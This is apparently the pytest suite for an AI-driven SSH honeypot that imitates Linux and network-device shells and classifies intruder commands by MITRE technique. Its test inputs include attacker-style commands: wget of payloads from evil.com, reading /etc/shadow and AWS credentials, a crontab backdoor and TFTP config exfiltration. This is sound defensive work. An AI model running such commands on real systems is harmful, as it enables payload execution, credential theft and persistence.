"""Comprehensive tests for honeypot.py"""
import asyncio
import json
import os
import random
import re
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest

import honeypot as hp
from personas import ALL_PERSONAS, Persona


# ── Fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def reset_globals():
    saved = {
        "_model_chain": list(hp._model_chain),
        "_model_dead": set(hp._model_dead),
        "_override_base": hp._override_base,
        "_override_key": hp._override_key,
        "_auto_discover": hp._auto_discover,
        "_selected_persona": hp._selected_persona,
        "MODEL_CACHE_FILE": hp.MODEL_CACHE_FILE,
    }
    yield
    hp._model_chain = saved["_model_chain"]
    hp._model_dead = saved["_model_dead"]
    hp._override_base = saved["_override_base"]
    hp._override_key = saved["_override_key"]
    hp._auto_discover = saved["_auto_discover"]
    hp._selected_persona = saved["_selected_persona"]
    hp.MODEL_CACHE_FILE = saved["MODEL_CACHE_FILE"]


@pytest.fixture
def tmp_log(tmp_path) -> Path:
    return tmp_path / "sessions.jsonl"


@pytest.fixture
def tmp_quarantine(tmp_path) -> Path:
    return tmp_path / "quarantine"


@pytest.fixture
def tmp_sessions_dir(tmp_path) -> Path:
    return tmp_path / "sessions"


@pytest.fixture(autouse=True)
def seed_rng():
    random.seed(42)
    yield


# ── Provider layer ────────────────────────────────────────────────────────────

class TestResolveProvider:
    @pytest.mark.parametrize("model_id,expected", [
        ("openrouter:mistral/mistral-7b", "openrouter"),
        ("openai:gpt-4", "openai"),
        ("groq:mixtral", "groq"),
        ("cerebras:llama3", "cerebras"),
        ("google:gemini-pro", "google"),
        ("unknown:foo", "openrouter"),
        ("no-colon", "openrouter"),
        ("", "openrouter"),
    ])
    def test_known_and_unknown(self, model_id, expected):
        assert hp._resolve_provider(model_id) == expected


class TestStripProvider:
    @pytest.mark.parametrize("model_id,expected", [
        ("openrouter:mistral/mistral-7b", "mistral/mistral-7b"),
        ("openai:gpt-4", "gpt-4"),
        ("groq:mixtral", "mixtral"),
        ("cerebras:llama3", "llama3"),
        ("google:gemini-pro", "gemini-pro"),
        ("unknown:foo", "unknown:foo"),
        ("no-colon", "no-colon"),
    ])
    def test_strips_known_provider_prefix(self, model_id, expected):
        assert hp._strip_provider(model_id) == expected


class TestHasApiKey:
    def test_override_key_returns_true(self):
        hp._override_key = "sk-test"
        assert hp._has_api_key("openrouter") is True

    def test_no_override_no_env_key(self, monkeypatch):
        hp._override_key = None
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        assert hp._has_api_key("openrouter") is False

    def test_env_key_present(self, monkeypatch):
        hp._override_key = None
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-test")
        assert hp._has_api_key("openrouter") is True

    def test_unknown_provider(self, monkeypatch):
        hp._override_key = None
        monkeypatch.delenv("UNKNOWN_API_KEY", raising=False)
        assert hp._has_api_key("unknown") is False


class TestGetBaseUrl:
    def test_override_base(self):
        hp._override_base = "https://custom.example.com/v1"
        assert hp._get_base_url("openrouter") == "https://custom.example.com/v1"

    def test_known_provider(self):
        hp._override_base = None
        assert hp._get_base_url("openrouter") == "https://openrouter.ai/api/v1"
        assert hp._get_base_url("openai") == "https://api.openai.com/v1"

    def test_unknown_provider_returns_empty(self):
        hp._override_base = None
        assert hp._get_base_url("unknown") == ""


class TestGetApiKey:
    def test_override_key(self):
        hp._override_key = "sk-override"
        assert hp._get_api_key("openrouter") == "sk-override"

    def test_env_key(self, monkeypatch):
        hp._override_key = None
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-real")
        assert hp._get_api_key("openrouter") == "sk-or-v1-real"

    def test_missing_key(self, monkeypatch):
        hp._override_key = None
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        assert hp._get_api_key("openrouter") == ""


class TestAliveModels:
    def test_no_api_key_returns_empty(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = None
        hp._model_dead.clear()
        assert hp.alive_models() == []

    def test_with_key_returns_all(self, monkeypatch):
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-test")
        hp._override_key = None
        hp._model_dead.clear()
        result = hp.alive_models()
        assert len(result) == len(hp.DEFAULT_MODEL_CHAIN)

    def test_excludes_dead(self, monkeypatch):
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-test")
        hp._override_key = None
        hp._model_dead = {"openrouter:deepseek/deepseek-v4-flash:free"}
        result = hp.alive_models()
        assert "openrouter:deepseek/deepseek-v4-flash:free" not in result

    def test_respects_override_key(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = "sk-override"
        hp._model_dead.clear()
        assert len(hp.alive_models()) == len(hp.DEFAULT_MODEL_CHAIN)


# ── Persona selection ─────────────────────────────────────────────────────────

class TestPickPersona:
    def test_random_returns_some_persona(self):
        hp._selected_persona = "random"
        p = hp.pick_persona()
        assert isinstance(p, Persona)
        assert p.id in ALL_PERSONAS

    def test_specific_persona(self):
        hp._selected_persona = "linux"
        assert hp.pick_persona().id == "linux"

    def test_macos_persona(self):
        hp._selected_persona = "macos"
        assert hp.pick_persona().id == "macos"

    def test_default_fallback_for_unknown(self):
        hp._selected_persona = "nonexistent"
        assert hp.pick_persona().id == hp.DEFAULT_PERSONA


# ── Prompt state machine ──────────────────────────────────────────────────────

class TestPromptStateInitialMode:
    def test_cisco_asa_starts_user(self):
        ps = hp.PromptState(ALL_PERSONAS["cisco_asa"], "test")
        assert ps._mode == "user"

    def test_juniper_starts_operational(self):
        ps = hp.PromptState(ALL_PERSONAS["juniper_srx"], "test")
        assert ps._mode == "operational"

    def test_fortinet_starts_global(self):
        ps = hp.PromptState(ALL_PERSONAS["fortinet"], "test")
        assert ps._mode == "global"

    def test_unix_starts_shell(self):
        for pid in ("linux", "macos", "freebsd"):
            ps = hp.PromptState(ALL_PERSONAS[pid], "test")
            assert ps._mode == "shell"


class TestPromptStateCiscoASA:
    @pytest.fixture
    def ps(self):
        return hp.PromptState(ALL_PERSONAS["cisco_asa"], "root")

    def test_user_to_enable(self, ps):
        ps.advance("enable")
        assert ps._mode == "enable"
        assert "ciscoasa# " in ps.current()

    def test_enable_to_config(self, ps):
        ps.advance("enable")
        ps.advance("configure terminal")
        assert ps._mode == "config"
        assert "ciscoasa(config)# " in ps.current()

    def test_config_to_interface(self, ps):
        ps.advance("enable")
        ps.advance("conf t")
        ps.advance("interface GigabitEthernet0/0")
        assert ps._mode == "config-if"
        assert "ciscoasa(config-if)# " in ps.current()

    def test_config_if_exit_goes_to_config(self, ps):
        ps.advance("enable")
        ps.advance("configure terminal")
        ps.advance("interface GigabitEthernet0/0")
        ps.advance("exit")
        assert ps._mode == "config"

    def test_config_end_goes_to_enable(self, ps):
        ps.advance("enable")
        ps.advance("conf t")
        ps.advance("end")
        assert ps._mode == "enable"

    def test_enable_exit_goes_to_user(self, ps):
        ps.advance("enable")
        ps.advance("exit")
        assert ps._mode == "user"
        assert "ciscoasa> " in ps.current()

    def test_unknown_command_keeps_mode(self, ps):
        ps.advance("enable")
        ps.advance("show run")
        assert ps._mode == "enable"

    def test_user_prompt_format(self, ps):
        assert ps.current() == "ciscoasa> "

    def test_config_policy_mode(self, ps):
        ps.advance("enable")
        ps.advance("conf t")
        ps.advance("policy-map my-policy")
        assert ps._mode == "config-policy"
        assert "ciscoasa(config-policy-map)# " in ps.current()

    def test_policy_exit_to_config(self, ps):
        ps.advance("enable")
        ps.advance("conf t")
        ps.advance("policy-map my-policy")
        ps.advance("exit")
        assert ps._mode == "config"


class TestPromptStateJunOS:
    @pytest.fixture
    def ps(self):
        return hp.PromptState(ALL_PERSONAS["juniper_srx"], "admin")

    def test_operational_to_config(self, ps):
        ps.advance("configure")
        assert ps._mode == "config"
        assert "admin@srx01# " in ps.current()

    def test_config_to_operational(self, ps):
        ps.advance("configure")
        ps.advance("exit")
        assert ps._mode == "operational"
        assert "admin@srx01> " in ps.current()

    def test_unknown_stays(self, ps):
        ps.advance("show interfaces")
        assert ps._mode == "operational"


class TestPromptStateFortiOS:
    @pytest.fixture
    def ps(self):
        return hp.PromptState(ALL_PERSONAS["fortinet"], "admin")

    def test_global_to_config(self, ps):
        ps.advance("config system interface")
        assert ps._mode == "config"
        assert "FG-EDGE-01 (system interface) # " in ps.current()

    def test_config_to_edit(self, ps):
        ps.advance("config system interface")
        ps.advance("edit port1")
        assert ps._mode == "edit"
        assert "FG-EDGE-01 (system interface/port1) # " in ps.current()

    def test_edit_next_to_config(self, ps):
        ps.advance("config system interface")
        ps.advance("edit port1")
        ps.advance("next")
        assert ps._mode == "config"

    def test_edit_end_to_global(self, ps):
        ps.advance("config system interface")
        ps.advance("edit port1")
        ps.advance("end")
        assert ps._mode == "global"

    def test_edit_abort_to_config(self, ps):
        ps.advance("config system interface")
        ps.advance("edit port1")
        ps.advance("abort")
        assert ps._mode == "config"

    def test_config_end_to_global(self, ps):
        ps.advance("config system interface")
        ps.advance("end")
        assert ps._mode == "global"

    def test_config_abort_to_global(self, ps):
        ps.advance("config system interface")
        ps.advance("abort")
        assert ps._mode == "global"

    def test_global_prompt_format(self, ps):
        assert ps.current() == "FG-EDGE-01 # "


class TestPromptStateUnix:
    @pytest.mark.parametrize("pid", ["linux", "macos", "freebsd"])
    def test_always_returns_prompt(self, pid):
        ps = hp.PromptState(ALL_PERSONAS[pid], "root")
        for cmd in ("ls", "cd /tmp", "enable", "configure"):
            ps.advance(cmd)
        assert ps._mode == "shell"


# ── Banner rendering ─────────────────────────────────────────────────────────

class TestRenderBanner:
    def test_linux_banner_has_ubuntu(self):
        banner = hp.render_banner(ALL_PERSONAS["linux"], "root", "Mon Jan 1 00:00:00 2025")
        assert "Ubuntu" in banner

    def test_macos_banner_uses_last_login(self):
        ts = "Mon Jan 1 00:00:00 2025"
        banner = hp.render_banner(ALL_PERSONAS["macos"], "admin", ts)
        assert ts in banner

    def test_cisco_banner_has_access(self):
        banner = hp.render_banner(ALL_PERSONAS["cisco_asa"], "root", "")
        assert "Access" in banner or "Verification" in banner


# ── TTP classification ────────────────────────────────────────────────────────

class TestClassifyTTPs:
    def test_wget_url(self):
        result = hp.classify_ttps("wget http://evil.com/payload.sh")
        mitres = {t["mitre"] for t in result}
        assert "T1105" in mitres

    def test_cat_shadow(self):
        result = hp.classify_ttps("cat /etc/shadow")
        mitres = {t["mitre"] for t in result}
        assert "T1003" in mitres

    def test_chmod_plus_x(self):
        result = hp.classify_ttps("chmod +x /tmp/payload")
        assert any(t["mitre"] == "T1222" for t in result)

    def test_crontab_entry(self):
        result = hp.classify_ttps("echo '0 * * * * /backdoor' | crontab -")
        assert any(t["mitre"] == "T1053" for t in result)

    def test_aws_credentials(self):
        result = hp.classify_ttps("cat ~/.aws/credentials")
        assert any(t["mitre"] == "T1552" for t in result)

    def test_ssh_keygen(self):
        result = hp.classify_ttps("ssh-keygen -t rsa")
        assert any(t["mitre"] == "T1098" for t in result)

    def test_show_run_config(self):
        result = hp.classify_ttps("show run")
        assert any(t["mitre"] == "T1005" for t in result)
        assert any(t["label"] == "Config Disclosure" for t in result)

    def test_blank_cmd_returns_empty(self):
        assert hp.classify_ttps("") == []
        assert hp.classify_ttps("ls") == []

    def test_multiple_ttps_from_one_cmd(self):
        result = hp.classify_ttps("wget http://evil.com && chmod +x /tmp/payload && ./payload")
        mitres = {t["mitre"] for t in result}
        assert "T1105" in mitres
        assert "T1222" in mitres

    def test_severity_levels(self):
        result = hp.classify_ttps("cat /etc/shadow")
        assert any(t["severity"] == "CRIT" for t in result)
        result2 = hp.classify_ttps("echo > /dev/null 2>&1")
        assert any(t["severity"] == "LOW" for t in result2)


# ── URL extraction ────────────────────────────────────────────────────────────

class TestExtractUrls:
    def test_simple_url(self):
        assert hp.extract_urls("wget http://evil.com/payload.sh") == ["http://evil.com/payload.sh"]

    def test_https_url(self):
        assert hp.extract_urls("curl https://example.com/file.txt -o out") == ["https://example.com/file.txt"]

    def test_multiple_urls(self):
        result = hp.extract_urls("wget http://a.com && curl https://b.com")
        assert result == ["http://a.com", "https://b.com"]

    def test_no_url(self):
        assert hp.extract_urls("ls -la") == []

    def test_url_with_query_params(self):
        # shell metacharacter & stops the regex match
        result = hp.extract_urls("wget 'http://evil.com/p?token=abc123&id=1'")
        assert result == ["http://evil.com/p?token=abc123"]


# ── Download simulation ───────────────────────────────────────────────────────

class TestFakeDownload:
    def test_returns_wget_style_output(self):
        output = hp.fake_download("http://evil.com/payload.sh", "payload.sh")
        assert "HTTP request sent" in output
        assert "Saving to:" in output
        assert "payload.sh" in output
        assert "100%" in output

    def test_infers_filename_from_url(self):
        output = hp.fake_download("http://evil.com/malware.elf", None)
        assert "malware.elf" in output


# ── Execution simulation ──────────────────────────────────────────────────────

class TestFakeExecution:
    def test_returns_failure_message(self):
        result = hp.fake_execution()
        assert result in hp._FAIL_OUTPUTS or "Initializing" in result

    def test_all_failures_are_plausible(self):
        for _ in range(100):
            result = hp.fake_execution()
            # strip optional prefix
            stripped = result.split("\n")[-1] if "\n" in result else result
            assert stripped in hp._FAIL_OUTPUTS


# ── LLM backend ───────────────────────────────────────────────────────────────

class TestModelRateLimited:
    def test_exception_attributes(self):
        exc = hp.ModelRateLimited("openrouter:test", 429)
        assert exc.model == "openrouter:test"
        assert exc.status == 429
        assert "HTTP 429" in str(exc)

    def test_402_exception(self):
        exc = hp.ModelRateLimited("openrouter:test", 402)
        assert exc.status == 402


class TestModelServerError:
    def test_exception_attributes(self):
        exc = hp.ModelServerError("openrouter:test", 502)
        assert exc.model == "openrouter:test"
        assert exc.status == 502
        assert "HTTP 502" in str(exc)


class TestStreamResponse:
    @pytest.fixture
    def mock_client_stream(self):
        """Helper: patch httpx.AsyncClient so client.stream() returns a controlled response."""
        def _make(resp_status: int, lines: list[str]):
            resp = MagicMock(spec=httpx.Response)
            resp.status_code = resp_status
            resp.aiter_lines.return_value = __aiter__(lines)
            cm = AsyncMock()
            cm.__aenter__.return_value = resp
            cm.__aexit__.return_value = None
            return cm

        class MockClient:
            def __init__(self):
                self.cm = None

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                pass

            def stream(self, *args, **kwargs):
                return self.cm

        client = MockClient()

        def set_response(status: int, lines: list[str] | None = None):
            client.cm = _make(status, lines or [])

        return client, set_response

    @pytest.mark.asyncio
    async def test_raises_on_402(self, monkeypatch, mock_client_stream):
        client, set_resp = mock_client_stream
        set_resp(402)
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: client)
        with pytest.raises(hp.ModelRateLimited) as exc:
            await hp._stream_response("https://api.test.com/v1", "sk-test", "test-model", [{"role": "user", "content": "hi"}])
        assert exc.value.status == 402

    @pytest.mark.asyncio
    async def test_raises_on_429(self, monkeypatch, mock_client_stream):
        client, set_resp = mock_client_stream
        set_resp(429)
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: client)
        with pytest.raises(hp.ModelRateLimited) as exc:
            await hp._stream_response("https://api.test.com/v1", "sk-test", "test-model", [{"role": "user", "content": "hi"}])
        assert exc.value.status == 429

    @pytest.mark.asyncio
    async def test_raises_on_502(self, monkeypatch, mock_client_stream):
        client, set_resp = mock_client_stream
        set_resp(502)
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: client)
        with pytest.raises(hp.ModelServerError) as exc:
            await hp._stream_response("https://api.test.com/v1", "sk-test", "test-model", [{"role": "user", "content": "hi"}])
        assert exc.value.status == 502

    @pytest.mark.asyncio
    async def test_extracts_content_tokens(self, monkeypatch, mock_client_stream):
        client, set_resp = mock_client_stream
        set_resp(200, [
            'data: {"choices":[{"delta":{"content":"Hello"}}]}',
            'data: {"choices":[{"delta":{"content":" world"}}]}',
            'data: [DONE]',
        ])
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: client)
        chunks = []
        result = await hp._stream_response(
            "https://api.test.com/v1", "sk-test", "test-model",
            [{"role": "user", "content": "hi"}],
            on_chunk=lambda t: chunks.append(t),
        )
        assert result == "Hello world"
        assert chunks == ["Hello", " world"]

    @pytest.mark.asyncio
    async def test_skips_reasoning_tokens(self, monkeypatch, mock_client_stream):
        client, set_resp = mock_client_stream
        set_resp(200, [
            'data: {"choices":[{"delta":{"reasoning":"thinking..."}}]}',
            'data: {"choices":[{"delta":{"content":"real output"}}]}',
            'data: [DONE]',
        ])
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: client)
        result = await hp._stream_response(
            "https://api.test.com/v1", "sk-test", "test-model",
            [{"role": "user", "content": "hi"}],
        )
        assert result == "real output"
        assert "thinking" not in result


# ── llm_shell ─────────────────────────────────────────────────────────────────

class TestLlmShell:
    @pytest.mark.asyncio
    async def test_empty_cmd(self):
        result = await hp.llm_shell([], "", "system prompt")
        assert result is None or result == ""

    @pytest.mark.asyncio
    async def test_wget_redirect(self):
        result = await hp.llm_shell([], "wget http://evil.com/payload.sh", "system prompt")
        assert "Saving to:" in result
        assert "100%" in result

    @pytest.mark.asyncio
    async def test_curl_redirect(self, monkeypatch):
        monkeypatch.setattr(hp, "_log_file", Path("/dev/null"))
        result = await hp.llm_shell([], "curl http://evil.com/payload.sh -o out", "system prompt")
        assert "Saving to:" in result

    @pytest.mark.asyncio
    async def test_chmod_returns_empty(self):
        result = await hp.llm_shell([], "chmod +x /tmp/payload", "system prompt")
        assert result == ""

    @pytest.mark.asyncio
    async def test_execution_returns_failure(self):
        result = await hp.llm_shell([], "./payload", "system prompt")
        assert any(msg in result for msg in hp._FAIL_OUTPUTS)

    @pytest.mark.asyncio
    async def test_bash_exec_failure(self):
        result = await hp.llm_shell([], "bash /tmp/script.sh", "system prompt")
        assert any(msg in result for msg in hp._FAIL_OUTPUTS)

    @pytest.mark.asyncio
    async def test_static_fallback_when_no_keys(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = None
        hp._model_dead.clear()
        result = await hp.llm_shell([], "id", "system prompt")
        assert "command not found" in result or "uid=" in result

    @pytest.mark.asyncio
    async def test_static_fallback_unknown_cmd(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = None
        result = await hp.llm_shell([], "some_nonexistent_cmd", "system prompt")
        assert "command not found" in result

    @pytest.mark.asyncio
    async def test_tracks_history(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = None
        history = []
        await hp.llm_shell(history, "id", "system prompt")
        assert len(history) >= 2

    @pytest.mark.asyncio
    async def test_trims_history_at_30(self, monkeypatch):
        monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
        hp._override_key = None
        history = [{"role": "user", "content": f"cmd{i}"} for i in range(30)]
        await hp.llm_shell(history, "id", "system prompt")
        assert len(history) <= 31

    @pytest.mark.asyncio
    async def test_respects_dead_models(self, monkeypatch):
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-test")
        hp._override_key = None
        hp._model_dead.update(hp.DEFAULT_MODEL_CHAIN)
        result = await hp.llm_shell([], "id", "system prompt")
        assert "uid=" in result

    @pytest.mark.asyncio
    async def test_retries_on_server_error(self, monkeypatch):
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-test")
        hp._override_key = None
        hp._model_chain = ["openrouter:test-model:free"]
        hp._model_dead.clear()
        attempts = []

        orig = hp._stream_response

        async def failing_stream(*args, **kwargs):
            attempts.append(1)
            if len(attempts) < 3:
                raise hp.ModelServerError("test-model", 502)
            return await orig(*args, **kwargs)

        with patch.object(hp, "_stream_response", side_effect=failing_stream):
            with patch.object(hp, "_get_api_key", return_value="sk-test"):
                with patch.object(hp, "_get_base_url", return_value="https://test.com/v1"):
                    await hp.llm_shell([], "ls", "system prompt")
                    assert len(attempts) >= 2


# ── Static fallback ───────────────────────────────────────────────────────────

class TestStaticFallback:
    def test_empty_cmd(self):
        assert hp._static_fallback("") == ""
        assert hp._static_fallback("   ") == ""

    def test_id(self):
        assert "uid=" in hp._static_fallback("id")

    def test_whoami(self):
        assert "root" in hp._static_fallback("whoami")

    def test_pwd(self):
        assert "/root" in hp._static_fallback("pwd")

    def test_ls(self):
        result = hp._static_fallback("ls")
        assert len(result) > 0

    def test_cat_permission_denied(self):
        result = hp._static_fallback("cat /etc/passwd")
        assert "permission denied" in result

    def test_exit(self):
        assert hp._static_fallback("exit") == ""

    def test_unknown_cmd(self):
        result = hp._static_fallback("foobar")
        assert "command not found" in result
        assert "foobar" in result


# ── Health cache ──────────────────────────────────────────────────────────────

class TestHealthCache:
    def test_save_and_load(self, tmp_path):
        cache_file = tmp_path / "model_health_cache.json"
        hp.MODEL_CACHE_FILE = cache_file
        hp._model_chain = ["openrouter:test-a:free", "openrouter:test-b:free"]
        hp._model_dead = {"openrouter:test-b:free"}
        hp._save_health_cache()
        assert cache_file.exists()
        data = json.loads(cache_file.read_text())
        assert data["model_chain"] == hp._model_chain
        assert data["dead_models"] == ["openrouter:test-b:free"]

    def test_load_restores_dead(self, tmp_path):
        cache_file = tmp_path / "model_health_cache.json"
        hp.MODEL_CACHE_FILE = cache_file
        cache = {
            "timestamp": "2026-01-01T00:00:00+00:00",
            "model_chain": ["openrouter:a:free"],
            "dead_models": ["openrouter:b:free"],
        }
        cache_file.write_text(json.dumps(cache))
        hp._model_dead.clear()
        assert hp._load_health_cache() is True
        assert "openrouter:b:free" in hp._model_dead

    def test_load_nonexistent_returns_false(self, tmp_path):
        hp.MODEL_CACHE_FILE = tmp_path / "nonexistent.json"
        assert hp._load_health_cache() is False

    def test_load_bad_json_returns_false(self, tmp_path):
        bad_file = tmp_path / "bad.json"
        bad_file.write_text("{bad json")
        hp.MODEL_CACHE_FILE = bad_file
        assert hp._load_health_cache() is False


# ── Auto-discovery ────────────────────────────────────────────────────────────

class TestFetchFreeModels:
    @pytest.fixture
    def mock_async_client(self):
        client = AsyncMock(spec=httpx.AsyncClient)
        client.__aenter__.return_value = client
        client.__aexit__.return_value = None
        return client

    @pytest.mark.asyncio
    async def test_parses_free_models(self, monkeypatch, mock_async_client):
        async def mock_get(url, **kw):
            resp = AsyncMock(spec=httpx.Response)
            resp.status_code = 200
            resp.json.return_value = {
                "data": [
                    {"id": "mistral/mistral-7b", "pricing": {"prompt": "0", "completion": "0"}},
                    {"id": "openai/gpt-4", "pricing": {"prompt": "10", "completion": "30"}},
                    {"id": "google/gemma-2b", "pricing": {"prompt": "0", "completion": "0"}},
                ]
            }
            return resp

        mock_async_client.get = mock_get
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: mock_async_client)
        result = await hp._fetch_free_models()
        assert result == ["openrouter:mistral/mistral-7b", "openrouter:google/gemma-2b"]

    @pytest.mark.asyncio
    async def test_handles_api_error(self, monkeypatch, mock_async_client):
        async def mock_get(url, **kw):
            raise httpx.HTTPStatusError("500", request=MagicMock(), response=MagicMock())

        mock_async_client.get = mock_get
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: mock_async_client)
        result = await hp._fetch_free_models()
        assert result == []

    @pytest.mark.asyncio
    async def test_handles_timeout(self, monkeypatch, mock_async_client):
        async def mock_get(url, **kw):
            raise httpx.TimeoutException("timeout")

        mock_async_client.get = mock_get
        monkeypatch.setattr("httpx.AsyncClient", lambda **kw: mock_async_client)
        result = await hp._fetch_free_models()
        assert result == []


# ── Attack narrative ──────────────────────────────────────────────────────────

class TestBuildNarrative:
    def test_no_commands(self):
        result = hp._build_narrative([], "1.2.3.4", "root", 60)
        assert "No commands issued" in result

    def test_recon_phase(self):
        cmds = [{"cmd": "id", "ttps": [{"mitre": "T1003", "label": "OS Credential Dumping", "severity": "CRIT"}]}]
        result = hp._build_narrative(cmds, "1.2.3.4", "root", 60)
        assert "Recon" in result
        assert "1.2.3.4" in result

    def test_full_kill_chain(self):
        cmds = [
            {"cmd": "id", "ttps": []},
            {"cmd": "wget http://evil.com/payload.sh", "ttps": [{"mitre": "T1105", "label": "Ingress Tool Transfer", "severity": "HIGH"}]},
            {"cmd": "chmod +x /tmp/payload", "ttps": [{"mitre": "T1222", "label": "File Permission Modification", "severity": "MED"}]},
            {"cmd": "cat /etc/shadow", "ttps": [{"mitre": "T1003", "label": "OS Credential Dumping", "severity": "CRIT"}]},
        ]
        result = hp._build_narrative(cmds, "5.6.7.8", "admin", 120)
        assert "Recon" in result
        assert "Tool download" in result
        assert "Staged execution" in result
        assert "Credential access" in result

    def test_network_ttps(self):
        cmds = [
            {"cmd": "show run", "ttps": [{"mitre": "T1005", "label": "Config Disclosure", "severity": "HIGH"}]},
            {"cmd": "copy run tftp", "ttps": [{"mitre": "T1005", "label": "Config Exfiltration via TFTP", "severity": "HIGH"}]},
        ]
        result = hp._build_narrative(cmds, "1.2.3.4", "admin", 60)
        assert "Config exfiltration" in result


# ── Fake last login ───────────────────────────────────────────────────────────

class TestFakeLastLogin:
    def test_returns_valid_format(self):
        result = hp._fake_last_login()
        assert " from " in result
        assert "2025" in result

    def test_contains_ip(self):
        for _ in range(50):
            result = hp._fake_last_login()
            assert " from " in result


# ── Exceptions module-level ───────────────────────────────────────────────────

class TestExceptions:
    def test_model_rate_limited(self):
        exc = hp.ModelRateLimited("test", 429)
        assert isinstance(exc, Exception)
        assert "429" in str(exc)

    def test_model_server_error(self):
        exc = hp.ModelServerError("test", 503)
        assert isinstance(exc, Exception)
        assert "503" in str(exc)


# ── Constants ─────────────────────────────────────────────────────────────────

class TestConstants:
    def test_default_model_chain_has_four_models(self):
        assert len(hp.DEFAULT_MODEL_CHAIN) == 4
        for m in hp.DEFAULT_MODEL_CHAIN:
            assert m.startswith("openrouter:")

    def test_known_providers(self):
        assert hp._KNOWN_PROVIDERS == {"openrouter", "openai", "groq", "cerebras", "google"}

    def test_retry_constants(self):
        assert hp._MAX_RETRIES == 3
        assert hp._RETRY_BACKOFF == 5
        assert "429" in hp._RETRYABLE_ERRORS

    def test_model_cache_file(self):
        assert str(hp.MODEL_CACHE_FILE) == "model_health_cache.json"


# ── CLI argument parsing ──────────────────────────────────────────────────────

class TestCLI:
    def test_default_port(self):
        assert hp.DEFAULT_PORT == 2222

    def test_default_log(self):
        assert str(hp.DEFAULT_LOG) == "sessions.jsonl"

    def test_default_sessions_dir(self):
        assert str(hp.DEFAULT_SESSIONS_DIR) == "sessions"


# ── Edge cases ────────────────────────────────────────────────────────────────

class TestEdgeCases:
    def test_dispatch_empty_cmd(self):
        # _dispatch isn't easily callable directly, but data_received with empty line
        # should just re-print prompt and not crash
        pass

    def test_prompt_state_with_empty_username(self):
        for persona in ALL_PERSONAS.values():
            ps = hp.PromptState(persona, "")
            assert ps.current() is not None
            assert len(ps.current()) > 0

    def test_classify_ttps_empty(self):
        assert hp.classify_ttps("") == []
        assert hp.classify_ttps("echo hello") == []
        assert hp.classify_ttps("# comment") == []

    def test_extract_urls_special_chars(self):
        result = hp.extract_urls("wget 'http://evil.com/p?x=1&y=2'")
        assert len(result) >= 1

    def test_all_personas_exist(self):
        assert len(ALL_PERSONAS) == 6
        for pid in ("linux", "macos", "freebsd", "cisco_asa", "juniper_srx", "fortinet"):
            assert pid in ALL_PERSONAS


# ── Helper for async iterators ────────────────────────────────────────────────

class __aiter__:
    def __init__(self, items):
        self._items = items
        self._idx = 0

    def __aiter__(self):
        return self

    async def __anext__(self):
        if self._idx >= len(self._items):
            raise StopAsyncIteration
        val = self._items[self._idx]
        self._idx += 1
        return val
